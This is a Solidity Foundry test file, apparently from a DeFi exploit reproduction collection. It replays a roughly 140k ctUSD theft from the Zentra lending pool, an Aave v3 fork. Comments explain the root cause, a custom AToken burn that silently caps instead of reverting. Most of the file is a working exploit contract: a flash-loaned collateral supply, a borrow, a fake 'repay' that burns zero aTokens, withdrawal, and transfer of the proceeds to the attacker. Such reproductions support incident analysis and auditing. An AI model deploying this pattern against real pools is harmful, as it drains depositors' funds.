// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~140,000 ctUSD (~$140k)
// Attacker : 0xA73d72d6A858Df742fe756dA5Cb61C2288A95C17
// Attack Contract : 0x8d85840F4c05a5D7385498F2a75daa54c6507b4b
// Vulnerable Contract : 0x62Ff719aBCaedEad9055BA980FCE3821eBdDA694 (custom AToken impl, rev 0x3)
// Victim : 0xBA2a69b92e0071924c387A200409B658E4f6cac8 (zctUSD / ctUSD reserve)
// Attack Tx : https://explorer.mainnet.citrea.xyz/tx/0x9ac5df7e93988cd977e4b1b0564f559ec3096db2fe1abdd97e45c348e3074aa1
//
// @Info
// Vulnerable Contract Code : https://explorer.mainnet.citrea.xyz/address/0x62Ff719aBCaedEad9055BA980FCE3821eBdDA694#code
//
// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2098414497199247690
// Root cause write-up : https://x.com/Rarma_/status/2097796641973744102
//
// Zentra is an Aave v3 fork on Citrea. Its custom AToken `_burnScaled` silently
// caps an oversize burn to the user's scaled balance instead of reverting.
// `repayWithATokens` with zero zctUSD therefore still burns the variable debt
// in full, so a flash-loaned USDC.e supply can borrow the ctUSD reserve and
// walk away with both the borrowed ctUSD and the collateral.

address constant ATTACKER = 0xA73d72d6A858Df742fe756dA5Cb61C2288A95C17;
address constant POOL = 0xfb7908150b738e7dB9862007c66C9eb7850706F5;
address constant ALGEBRA_CTUSD_USDC = 0x172D2AB563AFDaACE7247A6592EE1be62e791165;
address constant USDC_E = 0xE045e6c36cF77FAA2CfB54466D71A3aEF7bbE839;
address constant CTUSD = 0x8D82c4E3c936C7B5724A382a9c5a4E6Eb7aB6d5D;
address constant ZCTUSD = 0xBA2a69b92e0071924c387A200409B658E4f6cac8;
address constant ZUSDC = 0x01465912C8cEc266237050f429fE1b88dAa56C0A;
address constant ATOKEN_IMPL = 0x62Ff719aBCaedEad9055BA980FCE3821eBdDA694;
address constant VAR_DEBT_CTUSD = 0x5Eea9a01eec0B56935EFC77fc144b0826936F09C;
address constant VAR_DEBT_USDC = 0xD191C82a7bfb37e251fE2CA85777315a360164ab;

uint256 constant FORK_BLOCK = 12_428_144; // live attack is block 12_428_145
uint256 constant FLASH_USDC = 200_000e6;
uint256 constant BORROW_CTUSD = 140_000e6;
uint256 constant FEE_COVER_USDC = 30e6;
uint256 constant FEE_COVER_CTUSD = 50e6;
uint256 constant VARIABLE = 2;

interface IZentraPool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
    function repayWithATokens(address asset, uint256 amount, uint256 interestRateMode) external returns (uint256);
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IAlgebraPool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IScaledAToken {
    function scaledBalanceOf(address user) external view returns (uint256);
    function scaledTotalSupply() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8563", FORK_BLOCK);
        fundingToken = CTUSD;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(POOL, "Zentra Pool");
        vm.label(ALGEBRA_CTUSD_USDC, "Satsuma Algebra ctUSD/USDC.e");
        vm.label(USDC_E, "USDC.e");
        vm.label(CTUSD, "ctUSD");
        vm.label(ZCTUSD, "zctUSD");
        vm.label(ZUSDC, "zUSDC");
        vm.label(ATOKEN_IMPL, "Zentra AToken impl");
        vm.label(VAR_DEBT_CTUSD, "variableDebtZenctUSD");
        vm.label(VAR_DEBT_USDC, "variableDebtZenUSDC");
    }

    function testExploit() public {
        ZentraFinanceExploit exploit = new ZentraFinanceExploit(ATTACKER);

        uint256 attackerBefore = IERC20(CTUSD).balanceOf(ATTACKER);
        uint256 vaultBefore = IERC20(CTUSD).balanceOf(ZCTUSD);
        uint256 scaledBefore = IScaledAToken(ZCTUSD).scaledTotalSupply();

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(CTUSD).balanceOf(ATTACKER) - attackerBefore;
        uint256 vaultAfter = IERC20(CTUSD).balanceOf(ZCTUSD);
        uint256 scaledAfter = IScaledAToken(ZCTUSD).scaledTotalSupply();

        logTokenBalance(CTUSD, ATTACKER, "Attacker Final");
        emit log_named_decimal_uint("zctUSD vault ctUSD before", vaultBefore, 6);
        emit log_named_decimal_uint("zctUSD vault ctUSD after", vaultAfter, 6);
        emit log_named_uint("zctUSD scaledTotalSupply before", scaledBefore);
        emit log_named_uint("zctUSD scaledTotalSupply after", scaledAfter);

        assertGt(profit, 139_000e6, "ctUSD profit");
        assertEq(scaledAfter, scaledBefore, "aToken claims must be unchanged");
        assertLt(vaultAfter, vaultBefore - 139_000e6, "vault must lose ~140k ctUSD");
    }
}

contract ZentraFinanceExploit {
    address private immutable profitReceiver;

    IERC20 private constant usdc = IERC20(USDC_E);
    IERC20 private constant ctUsd = IERC20(CTUSD);
    IZentraPool private constant pool = IZentraPool(POOL);
    IAlgebraPool private constant algebra = IAlgebraPool(ALGEBRA_CTUSD_USDC);

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        // step 1: flash-borrow 200,000 USDC.e from the Satsuma Algebra ctUSD/USDC.e pool.
        // token0 = ctUSD, token1 = USDC.e, fee = 100 (0.01% → 20 USDC.e).
        algebra.flash(address(this), 0, FLASH_USDC, "");

        // step 8: send stolen ctUSD to the attacker EOA.
        uint256 profit = ctUsd.balanceOf(address(this));
        ctUsd.transfer(profitReceiver, profit);
    }

    function algebraFlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == ALGEBRA_CTUSD_USDC, "not algebra");

        // step 2: supply the flash-loaned USDC.e as Zentra collateral (85% LTV).
        usdc.approve(POOL, FLASH_USDC);
        pool.supply(USDC_E, FLASH_USDC, address(this), 0);

        // step 3: borrow 140,000 ctUSD out of the zctUSD vault against that collateral.
        pool.borrow(CTUSD, BORROW_CTUSD, VARIABLE, 0, address(this));

        // step 4: "repay" the ctUSD debt with useATokens while holding ZERO zctUSD.
        // The custom AToken `_burnScaled` safety guard caps the oversize burn to 0
        // instead of reverting, so the variable-debt token is burned in full and
        // the vault's scaled aToken supply does not decrease.
        uint256 ctUsdDebt = IERC20(VAR_DEBT_CTUSD).balanceOf(address(this));
        pool.repayWithATokens(CTUSD, ctUsdDebt, VARIABLE);

        // step 5: withdraw the USDC.e collateral — the position is now debt-free.
        pool.withdraw(USDC_E, type(uint256).max, address(this));

        // step 6: repeat the same bug on the USDC market for ~30 USDC.e to cover
        // the 20 USDC.e Algebra flash fee (and 1-wei withdraw rounding).
        ctUsd.approve(POOL, FEE_COVER_CTUSD);
        pool.supply(CTUSD, FEE_COVER_CTUSD, address(this), 0);
        pool.borrow(USDC_E, FEE_COVER_USDC, VARIABLE, 0, address(this));
        uint256 usdcDebt = IERC20(VAR_DEBT_USDC).balanceOf(address(this));
        pool.repayWithATokens(USDC_E, usdcDebt, VARIABLE);
        pool.withdraw(CTUSD, type(uint256).max, address(this));

        // step 7: repay the Algebra flash loan (principal + 0.01% fee).
        uint256 repayment = FLASH_USDC + fee1;
        usdc.transfer(ALGEBRA_CTUSD_USDC, repayment);
    }
}
